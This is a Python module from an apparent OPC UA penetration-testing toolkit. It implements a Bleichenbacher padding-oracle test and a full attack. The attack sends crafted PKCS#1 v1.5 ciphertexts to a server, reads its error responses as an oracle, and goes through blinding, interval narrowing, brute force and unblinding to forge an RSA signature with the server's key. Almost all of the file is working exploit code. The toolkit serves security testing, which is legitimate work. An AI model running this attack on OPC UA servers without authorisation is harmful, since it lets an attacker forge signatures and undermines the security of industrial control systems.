"""
Module for implementations of Bleichenbacher tests and attacks
"""

from concurrent.futures import Future
import logging
import math

import gmpy2
from opcua import ua

from opcuapen import constants
from opcuapen.client import OpcuaPenClient
from opcuapen.attacks import paddings, utils
from opcuapen.protocol import request
from opcuapen.reports import BleichenbacherReport

from opcuapen.bisect import insertion_point


logger = logging.getLogger(__name__)

class BleichenbacherOracleTest:
    """
    Test class to test servers for vulnerability to Bleichenbacher attack
    """
    def __init__(self, config):
        self.config = config

    def default_testing(self):
        """ Test a number of different paddings which are assembled by hand """
        blb = Bleichenbacher(self.config)

        pads = [paddings.pad_pkcs1v15,
                paddings.pkcs1v15_three,
                paddings.pkcs1v15_five,
                paddings.pkcs1v15_block,
                paddings.pkcs1v15_hack_any_plaintext_byte,
                paddings.pkcs1v15_short_plaintext,
                paddings.pkcs1v15_short_plaintext_and_three,
                paddings.pkcs1v15_only_rnd,
                paddings.pkcs1v15_late_zeros,
                paddings.pkcs1v15_zeros_in_rnd_padding,
                paddings.pkcs1v15_zeros_in_rnd_padding_no_stop,
                paddings.pkcs1v15_number_too_large]
        res = blb.test_paddings(pads)
        print()
        for pad, result in zip(pads, res):
            print('- {}: {}'.format(pad.__name__, result))

        print('True', res.count('True'))
        print('unknown block type', sum([1 for resp in res if 'unknown block type' in resp]))

    @staticmethod
    def checked_before(df_pad, f1, f2, bl):
        """ Check with the oracle whether manipulation f1 or f2 is checked first

        :param df_pad:
        :param f1:
        :param f2:
        :param bl:
        :return:
        """
        r1 = bl.test_paddings([lambda msg,
                                      default_pad=df_pad,
                                      pad=f1:
                               pad(default_pad(msg))])
        r2 = bl.test_paddings([lambda msg,
                                      default_pad=df_pad,
                                      pad1=f1,
                                      pad2=f2:
                               pad2(pad1(default_pad(msg)))])
        r3_for_testing = bl.test_paddings([lambda msg,
                                                  default_pad=df_pad, pad=f2:
                                           pad(default_pad(msg))])
        logger.error(r1)
        logger.error(r2)
        logger.error(r3_for_testing)
        return r1 == r2

    def generic_testing(self):
        """ Find the order of server-side checks by sending various manipulated messages

        :return: ordered list of server-side checks
        """
        blb = Bleichenbacher(self.config)

        dfp = paddings.pad_pkcs1v15
        pads = [paddings.in_first_ten_func,
                paddings.after_first_ten_func,
                paddings.three_func,
                paddings.short_func,
                paddings.no_stop_byte_func,
                paddings.one_func
               ]

        pds = {pad: {'name': pad.__name__, 'lmd': lambda msg,
                                                         pad=pad,
                                                         default_pad=dfp:
                                                  pad(default_pad(msg))} for pad in pads}

        for p in pds:
            pds[p]['err'] = blb.test_paddings([pds[p]['lmd']])[0]

        lst = []
        for p in pads:
            lst.insert(insertion_point(p, lst, lambda f1,
                                                      f2,
                                                      bl=blb:
                                       BleichenbacherOracleTest.checked_before(
                                           paddings.pad_pkcs1v15,
                                           f1, f2, bl)), p)
        print(lst)

        for i, l in enumerate(lst):
            print('{}. {}'.format(i+1, pds[l]['err']))


class Bleichenbacher:
    """ Attack class for Bleichenbacher attack """

    def __init__(self, config):
        self.opcuapen_client = OpcuaPenClient(config)
        self.client = None
        self.cert = self.opcuapen_client.get_server_certificate()
        self.count = 0
        self.binreq = None
        self.config = config
        self.create_client()

    def __enter__(self):
        """ Connect the socket """
        self.client.connect_socket()

    def __exit__(self, exc_type, exc_val, exc_tb):
        """ Disconnect the socket

        :param exc_type: exception type
        :param exc_val: exception value
        :param exc_tb: exception traceback
        """
        self.client.disconnect_socket()

    def create_client(self):
        """ Create client object if not existing yet """
        if not self.client:
            self.client = self.opcuapen_client.get_client()
        # sends a get endpoint request!
        self.opcuapen_client.set_security_policy()
        return self.client

    def send_bytes(self, msg):
        """ Send bytes to the configured endpoint

        :param msg: message as bytes
        """
        with self.client.uaclient._uasocket._lock:
            self.client.uaclient._uasocket._request_id = 1
            future = Future()
            self.client.uaclient._uasocket._callbackmap[
                self.client.uaclient._uasocket._request_id] = future
            self.client.uaclient._uasocket._socket.write(msg)

        return future

    @staticmethod
    def get_result(fut):
        """block until the future has a result or times out"""
        try:
            res = fut.result(timeout=2)
            if isinstance(res, ua.ErrorMessage):
                return res.Reason
            return 'True'
        except Exception:
            pass
        return 'False'

    def send_manipulated_message(self, padding=None, ciphertext_manipulator=None):
        """ Send a message to the configured server using the custom padding and a
        manipulation function applied on the ciphertext (right before sending)

        :param padding: padding function for the specific security policy
        :param ciphertext_manipulator: function that operates on the ciphertext before sending
        :return: the future object for the response
        """
        msg = request.pad_and_encrypt(self.get_request(self.client),
                                      self.client.uaclient._uasocket._connection,
                                      self.cert,
                                      padding=padding,
                                      ciphertext_manipulator=ciphertext_manipulator)

        return self.send_bytes(msg)

    def test_paddings(self, padding_vector):
        """ Send manipulated messages to a server and collect the results

        :param padding_vector: functions that pad the message to a full block
        :return: list of server responses
        """
        logger.debug("Testing vector %s", [fct.__name__ for fct in padding_vector])

        result_vect = []
        for padding in padding_vector:
            current_result = 'null'

            while 'null' in current_result:
                with self:
                    self.client.send_hello()
                    future = self.send_manipulated_message(padding=padding)
                    current_result = Bleichenbacher.get_result(future)
            result_vect.append(current_result)

        return result_vect

    def check_bleichenbacher_oracle(self, ciphertext_manipulator=None):
        """
        Request a Bleichenbacher oracle,
        thus return True if a message is found
        that lies within :math:`[2B, 3B-1]`

        :param ciphertext_manipulator: a function that performs arbitrary
        manipulations on the ciphertext right before sending it
        :return: the boolean oracle response
        """
        res = 'null'
        while 'null' in res:
            with self:
                self.client.send_hello()
                if not ciphertext_manipulator:
                    ciphertext_manipulator = self.prepare
                msg = request.pad_and_encrypt(self.binreq,
                                              self.client.uaclient._uasocket._connection,
                                              self.cert,
                                              padding=paddings.pad_pkcs1v15,
                                              ciphertext_manipulator=ciphertext_manipulator)
                res = Bleichenbacher.get_result(self.send_bytes(msg))

        self.count += 1

        # TODO be more generic about the responses to prevent false negatives
        return 'unknown block type' not in res \
                and 'input too large for RSA cipher' not in res \
                and 'block incorrect size' not in res

    def get_multiplied_msg(self, msg, s=None):
        """ Message multiplication modulo N

        :param msg: bytes or integer message
        :param s: factor
        :return: result of the multiplication as integer
        """

        N = self.cert.public_key().public_numbers().n
        e = self.cert.public_key().public_numbers().e

        if isinstance(msg, bytes):
            msg_int = int.from_bytes(msg, byteorder="big")
        elif isinstance(msg, int):
            msg_int = msg
        else:
            raise Exception('Can only handle bytes or integer message')

        if not s:
            s = self.s

        return int(gmpy2.mul(gmpy2.powmod(s, e, N), msg_int) % N)

    def prepare(self, msg):
        """ return :math:`msg * s_i^e` """
        return int.to_bytes(self.get_multiplied_msg(msg), byteorder="big", length=len(msg))

    def attack_initial_manipulator(self, msg):
        """ return :math:`C * s_i^e` """
        return int.to_bytes(self.get_multiplied_msg(self.C), byteorder="big", length=256)

    def attack_second_manipulator(self, msg):
        """ return :math:`c_0 * s_i^e` """
        return int.to_bytes(self.get_multiplied_msg(self.c_0), byteorder="big", length=256)

    def get_request(self, client):
        """ singleton """
        if not self.binreq:
            self.binreq = request.get_request(client)
        return self.binreq

    def blinding(self):
        """ Do Blinding (step 1 from the original Bleichenbacher algorithm
        """
        self.s = 1

        while not self.check_bleichenbacher_oracle(
                ciphertext_manipulator=self.attack_initial_manipulator):
            self.s += 1
        self.s_0 = self.s
        self.c_0 = int.from_bytes(self.attack_initial_manipulator(None), byteorder='big')

        logger.debug('s_0 = %s', self.s_0)

    def unblinding(self, new_a, N):
        """ Do unblinding (recover signature of the self-chosen message from signature for c_0

        :param new_a: signature for :math:`c_0`
        :param N: RSA modulus
        :return: valid signature for :math:`m`
        """
        s_0_inverse = int(gmpy2.invert(self.s_0, N))
        res = (s_0_inverse * new_a) % N
        return res

    def bruteforce(self, a, b, e, N):
        """ Forcefully find :math:`x \in [a, b]` such that :math:`x^e = c_0 \bmod N`

        :param a: lower interval bound
        :param b: upper interval bound
        :param e: exponent
        :param N: modulus
        :return: :math:`x`
        """
        logger.debug('Exhaustive search in interval [%s, %s]', a, b)
        for i in range(a, b+1):
            if self.c_0 == int(gmpy2.powmod(i, e, N)):
                return i
        return None

    def attack_signature(self):
        """ Forge a signature using the Bleichenbacher algorithm as in
        https://github.com/robotattackorg/robot-detect """

        # start a report
        report = BleichenbacherReport()
        report.set_pub_key_from_cert(self.cert.public_key())
        report.start()

        logger.debug('logging to %s', __name__)

        self.binreq = self.get_request(self.client)

        pub_key = self.cert.public_key()

        N = pub_key.public_numbers().n
        e = pub_key.public_numbers().e

        k = pub_key.key_size//8 # key size in Bytes
        B = 2**(8*(k-2))
        self.B = B

        logger.info("N = %d", N)
        logger.info("B = %d", B)

        logger.warning('Starting Bleichenbacher attack')

        # after optional blinding, the first interval is found
        a = int(2*B)
        b = int(3*B - 1)

        # to be signed
        tbs = "This message was signed with a Bleichenbacher oracle."
        self.C = int("0001" + "ff" * (k - len(tbs) - 3) + \
                     "00" + "".join("{:02x}".format(ord(c)) for c in tbs), 16)

        logger.debug('Signing message %s', hex(self.C))

        self.blinding()
        report.s_0 = self.s_0

        logger.debug("c_0 = %s", hex(self.c_0))
        logger.debug('Found s_0: %s, ', self.s_0)

        M = set()
        M.add((a, b))
        previntervalsize = 0
        i = 1
        while True:
            logger.debug('i = %d', i)
            logger.debug('len(M) = %d', len(M))
            # step 2a from the Bleichenbacher algorithm
            if i == 1:
                self.s = N // (3 * B)

                while not self.check_bleichenbacher_oracle(
                        ciphertext_manipulator=self.attack_second_manipulator):
                    self.s += 1
            # step 2b from the Bleichenbacher algorithm
            if i != 1 and len(M) >= 2:
                logger.debug('Step 2b')
                self.s += 1
                while not self.check_bleichenbacher_oracle(
                        ciphertext_manipulator=self.attack_second_manipulator):
                    self.s += 1
            # step 2c from the Bleichenbacher algorithm
            if i != 1 and len(M) == 1:
                logger.debug('Step 2c')
                a, b = M.pop()
                M.add((a, b))
                r = 2 * (b * self.s - 2 * B) // N
                self.s = (2 * B + r * N) // b

                while not self.check_bleichenbacher_oracle(
                        ciphertext_manipulator=self.attack_second_manipulator):
                    self.s += 1
                    if self.s > ((3 * B + r * N) // a):
                        r += 1
                        self.s = -(-(2 * B + r * N) // b)

            # compute all possible r, depending on the known bounds on m.
            Mnew = utils.find_bounds_from_s(M, N, B, self.s)
            # merge the new intervals with the old ones
            M = utils.merge_intervals(M, Mnew)

            if len(M) == 1:
                a, b = M.pop()
                M.add((a, b))
                intervalsize = int(math.ceil(math.log(b - a, 2)))
                if intervalsize != previntervalsize:
                    previntervalsize = intervalsize
                if intervalsize < 10:
                    break

            i += 1

        new_a = self.bruteforce(a, b, e, N)

        if not new_a:
            logger.error('Bruteforce didn\'t output a meaningful result. Aborting')
            report.stop()
            report.status = constants.STATUS_ABORTED
            return report

        # if message was blinded, do unblinding
        if self.s_0 != 1:
            res = self.unblinding(new_a, N)
            logger.debug('Result after unblinding is %s', hex(res))
        else:
            res = new_a

        # validation:
        validated_res = int(gmpy2.powmod(res, e, N))

        # RSA validation res^e == C mod N?
        logger.debug('Validation result is %s', validated_res == self.C)

        # finish report
        report.stop()
        report.status = constants.STATUS_SUCCESSFUL
        report.msg = hex(validated_res)
        report.sig = hex(res)
        report.messages = self.count

        return report
